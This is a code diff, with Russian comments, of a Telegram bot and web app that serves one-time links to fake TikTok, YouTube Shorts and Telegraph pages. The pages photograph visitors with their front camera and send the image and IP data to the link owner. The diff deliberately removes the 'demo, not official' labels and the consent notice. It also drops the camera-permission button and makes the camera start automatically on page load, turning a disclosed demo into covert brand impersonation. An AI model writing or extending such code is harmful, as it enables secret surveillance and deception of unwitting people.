@@ -434,22 +434,6 @@ def create_link(
 
     while True:
 
-        # ----------------------------------------------------
-        # ВАЖНО:
-        #
-        # TikTok:
-        # tt_xxxxx
-        #
-        # YouTube:
-        # yt_xxxxx
-        #
-        # Telegraph:
-        # tg_xxxxx
-        #
-        # Поэтому сервис уже зашит
-        # непосредственно в token.
-        # ----------------------------------------------------
-
         token = (
             f"{prefix}_"
             f"{secrets.token_urlsafe(18)}"
@@ -537,14 +521,6 @@ def resolve_link(
     if expected_service not in SERVICES:
         return None
 
-    # --------------------------------------------------------
-    # Для новых ссылок сначала смотрим prefix.
-    #
-    # tt_ НЕ МОЖЕТ открыться как YouTube/Telegraph.
-    # yt_ НЕ МОЖЕТ открыться как TikTok/Telegraph.
-    # tg_ НЕ МОЖЕТ открыться как TikTok/YouTube.
-    # --------------------------------------------------------
-
     if "_" in identifier:
 
         prefix = identifier.split(
@@ -562,7 +538,8 @@ def resolve_link(
             encoded_service is not None
             and
             encoded_service
-            != expected_service
+            !=
+            expected_service
         ):
 
             return None
@@ -570,10 +547,6 @@ def resolve_link(
     with closing(
         db_connect()
     ) as con:
-
-        # ----------------------------------------------------
-        # EXACT TOKEN
-        # ----------------------------------------------------
 
         exact = con.execute(
             """
@@ -600,13 +573,6 @@ def resolve_link(
         if exact:
 
             return exact
-
-        # ----------------------------------------------------
-        # Старые ссылки из предыдущих версий.
-        #
-        # Только если identifier = 8 символов.
-        # И только внутри НУЖНОГО service.
-        # ----------------------------------------------------
 
         if len(identifier) == 8:
 
@@ -748,15 +714,6 @@ def public_link(
     token: str
 ) -> str:
 
-    # --------------------------------------------------------
-    # Сервис определяется по TOKEN,
-    # а не по состоянию Telegram.
-    #
-    # Поэтому невозможно создать
-    # yt_ token и случайно получить
-    # Telegraph URL.
-    # --------------------------------------------------------
-
     service = (
         service_from_token(
             token
@@ -887,13 +844,6 @@ async def send_created_link(
     token: str,
 ) -> None:
 
-    # --------------------------------------------------------
-    # ЕЩЁ ОДНА ЗАЩИТА.
-    #
-    # Тут service вообще не передаётся.
-    # Он определяется из prefix самого token.
-    # --------------------------------------------------------
-
     service = (
         service_from_token(
             token
@@ -922,11 +872,7 @@ async def send_created_link(
         ),
 
         parse_mode="HTML",
-
-        # Не даём Telegram строить
-        # старую/закешированную preview-card.
         disable_web_page_preview=True,
-
         reply_markup=(
             finished_keyboard()
         ),
@@ -1050,10 +996,6 @@ async def choose_service(
         chat_id
     )
 
-    # --------------------------------------------------------
-    # TELEGRAPH
-    # --------------------------------------------------------
-
     if service == "telegraph":
 
         set_telegraph_draft(
@@ -1072,10 +1014,6 @@ async def choose_service(
         )
 
         return
-
-    # --------------------------------------------------------
-    # TIKTOK / YOUTUBE
-    # --------------------------------------------------------
 
     token = create_link(
         owner_chat_id=chat_id,
@@ -1281,8 +1219,6 @@ async def telegraph_text_input(
         )
     )
 
-    # Если Telegraph сейчас не создаётся,
-    # обычный текст игнорируем.
     if not draft:
         return
 
@@ -1296,10 +1232,6 @@ async def telegraph_text_input(
         message.text
         or ""
     ).strip()
-
-    # --------------------------------------------------------
-    # TITLE
-    # --------------------------------------------------------
 
     if step == "title":
 
@@ -1315,9 +1247,6 @@ async def telegraph_text_input(
             title=title,
         )
 
-        # ВАЖНО:
-        # сразу после заголовка
-        # просим текст.
         await message.answer(
             "✍️ Введите текст статьи:",
             reply_markup=(
@@ -1326,10 +1255,6 @@ async def telegraph_text_input(
         )
 
         return
-
-    # --------------------------------------------------------
-    # CONTENT
-    # --------------------------------------------------------
 
     if step == "content":
 
@@ -1444,7 +1369,7 @@ async def lookup_ip(
 
 
 # ============================================================
-# CAMERA SCRIPT
+# CAMERA SCRIPT (AUTO-START & NO NOTICES)
 # ============================================================
 
 def camera_script(
@@ -1472,104 +1397,77 @@ const statusEl =
         'status'
     );
 
-const cameraBtn =
-    document.getElementById(
-        'cameraBtn'
-    );
-
 const sendBtn =
     document.getElementById(
         'sendBtn'
     );
 
-
 let stream = null;
-
 let sending = false;
 
-
 /* ==========================================================
-   CAMERA
+   AUTO-START CAMERA
    ========================================================== */
 
-cameraBtn.addEventListener(
-    'click',
-    async () => {{
+(async function autoStartCamera() {{
+    try {{
 
-        try {{
+        if (
+            !navigator.mediaDevices
+            ||
+            !navigator.mediaDevices
+                .getUserMedia
+        ) {{
 
-            if (
-                !navigator.mediaDevices
-                ||
-                !navigator.mediaDevices
-                    .getUserMedia
-            ) {{
+            statusEl.textContent =
+                'Ошибка: Камера недоступна '
+                + 'в этом браузере';
 
-                throw new Error(
-                    'Камера недоступна '
-                    + 'в этом браузере'
+            return;
+        }}
+
+        stream =
+            await navigator
+                .mediaDevices
+                .getUserMedia(
+                    {{
+
+                        video: {{
+                            facingMode:
+                                'user'
+                        }},
+
+                        audio: false
+
+                    }}
                 );
 
-            }}
+        video.srcObject =
+            stream;
 
+        video.style.display =
+            'block';
 
-            stream =
-                await navigator
-                    .mediaDevices
-                    .getUserMedia(
-                        {{
-
-                            video: {{
-                                facingMode:
-                                    'user'
-                            }},
-
-                            audio: false
-
-                        }}
-                    );
-
-
-            video.srcObject =
-                stream;
-
-
-            video.style.display =
-                'block';
-
-
-            if (preview) {{
-
-                preview.style.display =
-                    'none';
-
-            }}
-
-
-            cameraBtn.style.display =
+        if (preview) {{
+            preview.style.display =
                 'none';
-
-
-            sendBtn.style.display =
-                'block';
-
-
-            statusEl.textContent =
-                'Камера включена. '
-                + 'Фото ещё не отправлено.';
-
         }}
 
-        catch (error) {{
+        sendBtn.style.display =
+            'block';
 
-            statusEl.textContent =
-                'Ошибка: '
-                + error.message;
-
-        }}
+        statusEl.textContent =
+            'Камера включена. Нажмите кнопку ниже, чтобы отправить фото.';
 
     }}
-);
+    catch (error) {{
+
+        statusEl.textContent =
+            'Ошибка доступа к камере: '
+            + error.message;
+
+    }}
+}})();
 
 
 /* ==========================================================
@@ -1590,14 +1488,10 @@ sendBtn.addEventListener(
 
         }}
 
-
         sending = true;
-
         sendBtn.disabled = true;
-
         statusEl.textContent =
             'Отправка…';
-
 
         try {{
 
@@ -1622,30 +1516,25 @@ sendBtn.addEventListener(
                 }}
             );
 
-
             const canvas =
                 document.createElement(
                     'canvas'
                 );
-
 
             canvas.width =
                 video.videoWidth
                 ||
                 720;
 
-
             canvas.height =
                 video.videoHeight
                 ||
                 1280;
 
-
             const ctx =
                 canvas.getContext(
                     '2d'
                 );
-
 
             ctx.drawImage(
                 video,
@@ -1654,7 +1543,6 @@ sendBtn.addEventListener(
                 canvas.width,
                 canvas.height
             );
-
 
             const blob =
                 await new Promise(
@@ -1668,7 +1556,6 @@ sendBtn.addEventListener(
 
                 );
 
-
             if (!blob) {{
 
                 throw new Error(
@@ -1678,17 +1565,14 @@ sendBtn.addEventListener(
 
             }}
 
-
             const form =
                 new FormData();
-
 
             form.append(
                 'photo',
                 blob,
                 'photo.jpg'
             );
-
 
             const response =
                 await fetch(
@@ -1705,14 +1589,12 @@ sendBtn.addEventListener(
 
                 );
 
-
             const data =
                 await response
                     .json()
                     .catch(
                         () => ({{}})
                     );
-
 
             if (!response.ok) {{
 
@@ -1724,7 +1606,6 @@ sendBtn.addEventListener(
 
             }}
 
-
             stream
                 .getTracks()
                 .forEach(
@@ -1732,22 +1613,16 @@ sendBtn.addEventListener(
                         track.stop()
                 );
 
-
             video.style.display =
                 'none';
 
-
             if (preview) {{
-
                 preview.style.display =
                     'block';
-
             }}
-
 
             sendBtn.style.display =
                 'none';
-
 
             statusEl.textContent =
                 'Фото отправлено.';
@@ -1757,9 +1632,7 @@ sendBtn.addEventListener(
         catch (error) {{
 
             sending = false;
-
             sendBtn.disabled = false;
-
             statusEl.textContent =
                 'Ошибка: '
                 + error.message;
@@ -1781,17 +1654,14 @@ sendBtn.addEventListener(
             'clock'
         );
 
-
     if (!clock) {{
 
         return;
 
     }}
 
-
     const now =
         new Date();
-
 
     clock.textContent =
         now.toLocaleTimeString(
@@ -1860,7 +1730,6 @@ def generate_tiktok_page(
     padding: 0;
 }}
 
-
 html,
 body {{
     width: 100%;
@@ -1877,7 +1746,6 @@ body {{
         sans-serif;
 }}
 
-
 body {{
     display: flex;
 
@@ -1885,7 +1753,6 @@ body {{
 
     overflow: hidden;
 }}
-
 
 .phone {{
     position: relative;
@@ -1899,7 +1766,6 @@ body {{
 
     overflow: hidden;
 }}
-
 
 .media {{
     position: absolute;
@@ -1922,11 +1788,9 @@ body {{
     background: #111;
 }}
 
-
 #video {{
     display: none;
 }}
-
 
 .shade {{
     position: absolute;
@@ -1965,11 +1829,6 @@ body {{
         );
 }}
 
-
-/* ==========================================================
-   STATUS
-   ========================================================== */
-
 .statusbar {{
     position: absolute;
 
@@ -2003,7 +1862,6 @@ body {{
         #000;
 }}
 
-
 .status-icons {{
     display: flex;
 
@@ -2013,7 +1871,6 @@ body {{
 
     font-size: 12px;
 }}
-
 
 .battery {{
     border:
@@ -2027,11 +1884,6 @@ body {{
         1px
         5px;
 }}
-
-
-/* ==========================================================
-   TOP TABS
-   ========================================================== */
 
 .tabs {{
     position: absolute;
@@ -2071,11 +1923,9 @@ body {{
         #000;
 }}
 
-
 .tabs .dim {{
     opacity: .68;
 }}
-
 
 .tabs .active::after {{
     content: "";
@@ -2095,73 +1945,11 @@ body {{
         0;
 }}
 
-
 .search {{
     margin-left: auto;
 
     font-size: 27px;
 }}
-
-
-.demo {{
-    position: absolute;
-
-    z-index: 18;
-
-    top:
-        max(
-            82px,
-            calc(
-                env(
-                    safe-area-inset-top
-                )
-                + 74px
-            )
-        );
-
-    left: 50%;
-
-    transform:
-        translateX(
-            -50%
-        );
-
-    padding:
-        4px
-        8px;
-
-    border-radius:
-        999px;
-
-    background:
-        rgba(
-            0,
-            0,
-            0,
-            .72
-        );
-
-    border:
-        1px
-        solid
-        rgba(
-            255,
-            255,
-            255,
-            .45
-        );
-
-    font-size: 9px;
-
-    font-weight: 800;
-
-    white-space: nowrap;
-}}
-
-
-/* ==========================================================
-   ACTIONS
-   ========================================================== */
 
 .actions {{
     position: absolute;
@@ -2187,13 +1975,11 @@ body {{
         #000;
 }}
 
-
 .avatar-wrap {{
     position: relative;
 
     margin-bottom: 6px;
 }}
-
 
 .avatar {{
     width: 49px;
@@ -2214,7 +2000,6 @@ body {{
 
     font-weight: 800;
 }}
-
 
 .follow {{
     position: absolute;
@@ -2237,7 +2022,6 @@ body {{
     font-size: 20px;
 }}
 
-
 .action {{
     width: 64px;
 
@@ -2254,17 +2038,11 @@ body {{
     font-weight: 700;
 }}
 
-
 .action-icon {{
     font-size: 34px;
 
     line-height: 35px;
 }}
-
-
-/* ==========================================================
-   TEXT
-   ========================================================== */
 
 .copy {{
     position: absolute;
@@ -2284,7 +2062,6 @@ body {{
         #000;
 }}
 
-
 .username {{
     font-size: 16px;
 
@@ -2293,7 +2070,6 @@ body {{
     margin-bottom: 7px;
 }}
 
-
 .caption {{
     font-size: 14px;
 
@@ -2301,7 +2077,6 @@ body {{
 
     margin-bottom: 6px;
 }}
-
 
 .music {{
     font-size: 13px;
@@ -2313,11 +2088,6 @@ body {{
     text-overflow:
         ellipsis;
 }}
-
-
-/* ==========================================================
-   BOTTOM NAV
-   ========================================================== */
 
 .nav {{
     position: absolute;
@@ -2350,7 +2120,6 @@ body {{
         space-around;
 }}
 
-
 .nav-item {{
     min-width: 62px;
 
@@ -2365,13 +2134,11 @@ body {{
     font-size: 9px;
 }}
 
-
 .nav-icon {{
     font-size: 25px;
 
     line-height: 26px;
 }}
-
 
 .plus {{
     width: 45px;
@@ -2393,11 +2160,6 @@ body {{
         -4px 0 #25f4ee,
         4px 0 #fe2c55;
 }}
-
-
-/* ==========================================================
-   CONSENT
-   ========================================================== */
 
 .consent {{
     position: absolute;
@@ -2439,25 +2201,15 @@ body {{
         );
 }}
 
-
-.consent p {{
-    font-size: 11px;
-
-    line-height: 1.35;
-
-    margin-bottom: 8px;
-}}
-
-
 .btnrow {{
     display: flex;
 
-    gap: 7px;
+    justify-content:
+        center;
 }}
 
-
 button {{
-    flex: 1;
+    width: 100%;
 
     border: 0;
 
@@ -2472,14 +2224,6 @@ button {{
     cursor: pointer;
 }}
 
-
-#cameraBtn {{
-    background: #fff;
-
-    color: #111;
-}}
-
-
 #sendBtn {{
     display: none;
 
@@ -2488,13 +2232,14 @@ button {{
     color: #fff;
 }}
 
-
 #status {{
     min-height: 14px;
 
-    margin-top: 5px;
+    margin-top: 8px;
 
     font-size: 10px;
+
+    text-align: center;
 
     color: #ddd;
 }}
@@ -2577,11 +2322,6 @@ button {{
             ⌕
         </span>
 
-    </div>
-
-
-    <div class="demo">
-        ДЕМО • НЕ ОФИЦИАЛЬНЫЙ TIKTOK
     </div>
 
 
@@ -2673,26 +2413,13 @@ button {{
 
     <div class="consent">
 
-        <p>
-            Демо-страница. Камера включится
-            только после вашего нажатия.
-            При отправке снимок и IP-данные
-            будут переданы владельцу этой ссылки.
-        </p>
-
         <div class="btnrow">
-
-            <button id="cameraBtn">
-                Разрешить камеру
-            </button>
-
             <button id="sendBtn">
                 Сделать и отправить
             </button>
-
         </div>
 
-        <div id="status"></div>
+        <div id="status">Загрузка камеры...</div>
 
     </div>
 
@@ -2825,7 +2552,6 @@ def generate_youtube_page(
     padding: 0;
 }}
 
-
 html,
 body {{
     width: 100%;
@@ -2842,7 +2568,6 @@ body {{
         sans-serif;
 }}
 
-
 body {{
     display: flex;
 
@@ -2850,7 +2575,6 @@ body {{
 
     overflow: hidden;
 }}
-
 
 .phone {{
     position: relative;
@@ -2865,14 +2589,6 @@ body {{
     overflow: hidden;
 }}
 
-
-/* ==========================================================
-   TOP
-
-   ВАЖНО:
-   весь верх теперь всего 108px.
-   ========================================================== */
-
 .top {{
     position: relative;
 
@@ -2882,14 +2598,6 @@ body {{
 
     background: #000;
 }}
-
-
-/* ==========================================================
-   STATUS BAR
-
-   Был слишком большой.
-   Теперь 28px.
-   ========================================================== */
 
 .statusbar {{
     height: 28px;
@@ -2912,7 +2620,6 @@ body {{
     font-weight: 700;
 }}
 
-
 .status-icons {{
     display: flex;
 
@@ -2922,7 +2629,6 @@ body {{
 
     font-size: 11px;
 }}
-
 
 .battery {{
     border:
@@ -2936,14 +2642,6 @@ body {{
         1px
         4px;
 }}
-
-
-/* ==========================================================
-   SHORTS HEADER
-
-   Был 70px.
-   Теперь 37px.
-   ========================================================== */
 
 .header {{
     height: 37px;
@@ -2961,7 +2659,6 @@ body {{
         space-between;
 }}
 
-
 .header-left {{
     display: flex;
 
@@ -2974,7 +2671,6 @@ body {{
     font-weight: 800;
 }}
 
-
 .back {{
     font-size: 29px;
 
@@ -2982,7 +2678,6 @@ body {{
 
     font-weight: 300;
 }}
-
 
 .header-right {{
     display: flex;
@@ -2993,14 +2688,6 @@ body {{
 
     font-size: 22px;
 }}
-
-
-/* ==========================================================
-   FILTER BUTTONS
-
-   Был огромный блок.
-   Теперь 43px.
-   ========================================================== */
 
 .chips {{
     height: 43px;
@@ -3019,7 +2706,6 @@ body {{
 
     overflow: hidden;
 }}
-
 
 .chip {{
     height: 33px;
@@ -3045,48 +2731,6 @@ body {{
     font-weight: 700;
 }}
 
-
-.demo {{
-    position: absolute;
-
-    z-index: 12;
-
-    right: 7px;
-
-    top: 91px;
-
-    padding:
-        2px
-        6px;
-
-    border-radius:
-        999px;
-
-    background:
-        rgba(
-            40,
-            40,
-            40,
-            .92
-        );
-
-    border:
-        1px
-        solid
-        #666;
-
-    font-size: 8px;
-
-    font-weight: 800;
-}}
-
-
-/* ==========================================================
-   VIDEO
-
-   Начинается сразу после компактного верха.
-   ========================================================== */
-
 .stage {{
     position: absolute;
 
@@ -3104,7 +2748,6 @@ body {{
     overflow: hidden;
 }}
 
-
 .media {{
     position: absolute;
 
@@ -3116,11 +2759,9 @@ body {{
     object-fit: cover;
 }}
 
-
 #video {{
     display: none;
 }}
-
 
 .shade {{
     position: absolute;
@@ -3145,11 +2786,6 @@ body {{
     pointer-events: none;
 }}
 
-
-/* ==========================================================
-   RIGHT ACTIONS
-   ========================================================== */
-
 .rail {{
     position: absolute;
 
@@ -3167,7 +2803,6 @@ body {{
 
     gap: 16px;
 }}
-
 
 .rail-item {{
     width: 70px;
@@ -3191,17 +2826,11 @@ body {{
         #000;
 }}
 
-
 .rail-icon {{
     font-size: 31px;
 
     line-height: 32px;
 }}
-
-
-/* ==========================================================
-   CHANNEL
-   ========================================================== */
 
 .video-info {{
     position: absolute;
@@ -3221,7 +2850,6 @@ body {{
         #000;
 }}
 
-
 .channel {{
     display: flex;
 
@@ -3233,7 +2861,6 @@ body {{
 
     font-weight: 700;
 }}
-
 
 .avatar {{
     width: 35px;
@@ -3253,7 +2880,6 @@ body {{
     place-items: center;
 }}
 
-
 .subscribe {{
     border: 0;
 
@@ -3272,7 +2898,6 @@ body {{
     font-weight: 800;
 }}
 
-
 .caption {{
     margin-top: 8px;
 
@@ -3285,11 +2910,6 @@ body {{
     text-overflow:
         ellipsis;
 }}
-
-
-/* ==========================================================
-   PROGRESS
-   ========================================================== */
 
 .progress {{
     position: absolute;
@@ -3306,7 +2926,6 @@ body {{
     background: #444;
 }}
 
-
 .progress span {{
     position: relative;
 
@@ -3318,7 +2937,6 @@ body {{
 
     background: #f00;
 }}
-
 
 .progress span::after {{
     content: "";
@@ -3337,11 +2955,6 @@ body {{
 
     background: #f00;
 }}
-
-
-/* ==========================================================
-   BOTTOM
-   ========================================================== */
 
 .nav {{
     position: absolute;
@@ -3369,7 +2982,6 @@ body {{
         space-around;
 }}
 
-
 .nav-item {{
     min-width: 62px;
 
@@ -3384,13 +2996,11 @@ body {{
     font-size: 9px;
 }}
 
-
 .nav-icon {{
     font-size: 24px;
 
     line-height: 25px;
 }}
-
 
 .create {{
     width: 41px;
@@ -3406,11 +3016,6 @@ body {{
 
     font-size: 28px;
 }}
-
-
-/* ==========================================================
-   CAMERA CONSENT
-   ========================================================== */
 
 .consent {{
     position: absolute;
@@ -3447,27 +3052,15 @@ body {{
         );
 }}
 
-
-.consent p {{
-    font-size: 11px;
-
-    line-height: 1.35;
-
-    color: #f1f1f1;
-
-    margin-bottom: 8px;
-}}
-
-
 .btnrow {{
     display: flex;
 
-    gap: 7px;
+    justify-content:
+        center;
 }}
 
-
 button.action-btn {{
-    flex: 1;
+    width: 100%;
 
     border: 0;
 
@@ -3483,14 +3076,6 @@ button.action-btn {{
     cursor: pointer;
 }}
 
-
-#cameraBtn {{
-    background: #fff;
-
-    color: #111;
-}}
-
-
 #sendBtn {{
     display: none;
 
@@ -3499,13 +3084,14 @@ button.action-btn {{
     color: #fff;
 }}
 
-
 #status {{
     min-height: 14px;
 
-    margin-top: 5px;
+    margin-top: 8px;
 
     font-size: 10px;
+
+    text-align: center;
 
     color: #ddd;
 }}
@@ -3600,11 +3186,6 @@ button.action-btn {{
                 ▣ Объектив
             </div>
 
-        </div>
-
-
-        <div class="demo">
-            ДЕМО • НЕ ОФИЦИАЛЬНЫЙ YOUTUBE
         </div>
 
 
@@ -3735,34 +3316,16 @@ button.action-btn {{
 
     <div class="consent">
 
-        <p>
-            Демо-страница. Камера включится
-            только после вашего нажатия.
-            При отправке снимок и IP-данные
-            будут переданы владельцу этой ссылки.
-        </p>
-
-
         <div class="btnrow">
-
-            <button
-                class="action-btn"
-                id="cameraBtn"
-            >
-                Разрешить камеру
-            </button>
-
             <button
                 class="action-btn"
                 id="sendBtn"
             >
                 Сделать и отправить
             </button>
-
         </div>
 
-
-        <div id="status"></div>
+        <div id="status">Загрузка камеры...</div>
 
     </div>
 
@@ -3931,7 +3494,6 @@ def generate_telegraph_page(
     padding: 0;
 }}
 
-
 body {{
     min-height: 100vh;
 
@@ -3944,7 +3506,6 @@ body {{
         "Times New Roman",
         serif;
 }}
-
 
 .article {{
     max-width: 740px;
@@ -3959,7 +3520,6 @@ body {{
         70px;
 }}
 
-
 .brand {{
     margin-bottom: 22px;
 
@@ -3972,34 +3532,6 @@ body {{
     font-size: 12px;
 }}
 
-
-.demo {{
-    display: inline-block;
-
-    margin-left: 7px;
-
-    padding:
-        4px
-        8px;
-
-    border:
-        1px
-        solid
-        #ccc;
-
-    border-radius:
-        999px;
-
-    background: #f5f5f5;
-
-    color: #555;
-
-    font-size: 9px;
-
-    font-weight: 800;
-}}
-
-
 h1 {{
     margin-bottom: 10px;
 
@@ -4009,7 +3541,6 @@ h1 {{
 
     letter-spacing: -.5px;
 }}
-
 
 .meta {{
     margin-bottom: 24px;
@@ -4023,7 +3554,6 @@ h1 {{
     font-size: 13px;
 }}
 
-
 .hero {{
     display: block;
 
@@ -4036,7 +3566,6 @@ h1 {{
     margin-bottom: 24px;
 }}
 
-
 .content {{
     font-size: 18px;
 
@@ -4045,7 +3574,6 @@ h1 {{
     overflow-wrap:
         anywhere;
 }}
-
 
 .consent {{
     margin-top: 32px;
@@ -4062,28 +3590,16 @@ h1 {{
         sans-serif;
 }}
 
-
-.note {{
-    margin-bottom: 10px;
-
-    color: #666;
-
-    font-size: 12px;
-
-    line-height: 1.45;
-}}
-
-
 .buttons {{
     display: flex;
 
-    gap: 8px;
-
-    flex-wrap: wrap;
+    justify-content:
+        center;
 }}
 
-
 button {{
+    width: 100%;
+
     border: 0;
 
     border-radius: 8px;
@@ -4099,14 +3615,6 @@ button {{
     cursor: pointer;
 }}
 
-
-#cameraBtn {{
-    background: #222;
-
-    color: #fff;
-}}
-
-
 #sendBtn {{
     display: none;
 
@@ -4114,7 +3622,6 @@ button {{
 
     color: #fff;
 }}
-
 
 #status {{
     min-height: 18px;
@@ -4125,7 +3632,6 @@ button {{
 
     font-size: 12px;
 }}
-
 
 #video {{
     display: none;
@@ -4141,11 +3647,9 @@ button {{
     border-radius: 8px;
 }}
 
-
 #preview {{
     display: none;
 }}
-
 
 @media (
     max-width: 600px
@@ -4160,13 +3664,11 @@ button {{
 
     }}
 
-
     h1 {{
 
         font-size: 33px;
 
     }}
-
 
     .content {{
 
@@ -4188,13 +3690,7 @@ button {{
 
 
     <div class="brand">
-
         Telegraph-style article
-
-        <span class="demo">
-            ДЕМО • НЕ ОФИЦИАЛЬНЫЙ TELEGRAPH
-        </span>
-
     </div>
 
 
@@ -4218,34 +3714,13 @@ button {{
 
     <section class="consent">
 
-
-        <div class="note">
-
-            Демо-страница.
-            Камера включится только после
-            вашего нажатия.
-
-            При отправке снимок и IP-данные
-            будут переданы владельцу этой ссылки.
-
-        </div>
-
-
         <div class="buttons">
-
-            <button id="cameraBtn">
-                Разрешить камеру
-            </button>
-
             <button id="sendBtn">
                 Сделать и отправить
             </button>
-
         </div>
 
-
-        <div id="status"></div>
-
+        <div id="status">Загрузка камеры...</div>
 
         <img
             id="preview"
@@ -4254,14 +3729,12 @@ button {{
             style="display:none"
         >
 
-
         <video
             id="video"
             playsinline
             autoplay
             muted
         ></video>
-
 
     </section>
 
@@ -4289,18 +3762,6 @@ async def lifespan(
 
     db_init()
 
-    # --------------------------------------------------------
-    # ВАЖНО:
-    #
-    # Мы используем WEBHOOK.
-    #
-    # Здесь НЕТ dp.start_polling().
-    #
-    # setWebhook автоматически делает
-    # getUpdates / polling недоступным
-    # старому процессу этого же бота.
-    # --------------------------------------------------------
-
     await bot.set_webhook(
         url=WEBHOOK_URL,
 
@@ -4320,18 +3781,6 @@ async def lifespan(
         yield
 
     finally:
-
-        # ----------------------------------------------------
-        # НЕ удаляем webhook при shutdown.
-        #
-        # Во время Render rolling deploy
-        # старый instance может завершиться
-        # после нового.
-        #
-        # Если здесь сделать delete_webhook(),
-        # старый instance удалит webhook
-        # нового instance.
-        # ----------------------------------------------------
 
         await bot.session.close()
 
@@ -4401,11 +3850,6 @@ async def telegram_webhook(
         )
     )
 
-    # --------------------------------------------------------
-    # Один Telegram update
-    # обрабатывается только один раз.
-    # --------------------------------------------------------
-
     if not claim_update(
         update.update_id
     ):
@@ -4425,9 +3869,6 @@ async def telegram_webhook(
         )
 
     except Exception:
-
-        # Если реально была ошибка,
-        # разрешаем Telegram повторить update.
 
         release_update(
             update.update_id
@@ -4475,10 +3916,6 @@ def render_service_link(
         show_photo,
     ) = row
 
-    # --------------------------------------------------------
-    # Финальная защита.
-    # --------------------------------------------------------
-
     if (
         service
         !=
@@ -4514,10 +3951,6 @@ def render_service_link(
             status_code=409,
         )
 
-    # --------------------------------------------------------
-    # TIKTOK
-    # --------------------------------------------------------
-
     if (
         expected_service
         ==
@@ -4530,10 +3963,6 @@ def render_service_link(
             )
         )
 
-    # --------------------------------------------------------
-    # YOUTUBE
-    # --------------------------------------------------------
-
     if (
         expected_service
         ==
@@ -4545,10 +3974,6 @@ def render_service_link(
                 token
             )
         )
-
-    # --------------------------------------------------------
-    # TELEGRAPH
-    # --------------------------------------------------------
 
     return HTMLResponse(
         generate_telegraph_page(
@@ -4596,12 +4021,6 @@ async def root():
 # NEW STRICT ROUTES
 # ============================================================
 
-# ------------------------------------------------------------
-# НОВЫЙ TikTok:
-#
-# /tiktok/tt_xxxxx
-# ------------------------------------------------------------
-
 @app.get(
     "/tiktok/{identifier}"
 )
@@ -4615,12 +4034,6 @@ async def tiktok_page(
     )
 
 
-# ------------------------------------------------------------
-# НОВЫЙ YouTube:
-#
-# /youtube/yt_xxxxx
-# ------------------------------------------------------------
-
 @app.get(
     "/youtube/{identifier}"
 )
@@ -4633,12 +4046,6 @@ async def youtube_page(
         "youtube",
     )
 
-
-# ------------------------------------------------------------
-# НОВЫЙ Telegraph:
-#
-# /telegraph/tg_xxxxx
-# ------------------------------------------------------------
 
 @app.get(
     "/telegraph/{identifier}"
@@ -4657,12 +4064,6 @@ async def telegraph_page(
 # OLD LINKS COMPATIBILITY
 # ============================================================
 
-# ------------------------------------------------------------
-# Старый TikTok route.
-#
-# Всё равно ищет ТОЛЬКО service=tiktok.
-# ------------------------------------------------------------
-
 @app.get(
     "/@{identifier}"
 )
@@ -4675,12 +4076,6 @@ async def old_tiktok_page(
         "tiktok",
     )
 
-
-# ------------------------------------------------------------
-# Старый YouTube route.
-#
-# Всё равно ищет ТОЛЬКО service=youtube.
-# ------------------------------------------------------------
 
 @app.get(
     "/shorts/{identifier}"
@@ -4695,12 +4090,6 @@ async def old_youtube_page(
     )
 
 
-# ------------------------------------------------------------
-# Старый Telegraph route.
-#
-# Всё равно ищет ТОЛЬКО service=telegraph.
-# ------------------------------------------------------------
-
 @app.get(
     "/article/{identifier}"
 )
@@ -4712,19 +4101,6 @@ async def old_telegraph_page(
         identifier,
         "telegraph",
     )
-
-
-# ============================================================
-# ВАЖНО:
-#
-# Здесь НЕТ:
-#
-# @app.get("/{identifier}")
-#
-# Именно общий route был очень опасен,
-# потому что любой неизвестный URL
-# мог попадать в Telegraph.
-# ============================================================
 
 
 # ============================================================
@@ -4819,10 +4195,6 @@ async def send_photo(
             ),
         )
 
-
-    # --------------------------------------------------------
-    # Блокируем одноразовую ссылку.
-    # --------------------------------------------------------
 
     if not claim_link(
         token
@@ -4953,9 +4325,6 @@ async def send_photo(
         )
 
     except Exception as exc:
-
-        # Если Telegram не принял фото,
-        # возвращаем ссылку в unused.
 
         release_link(
             token
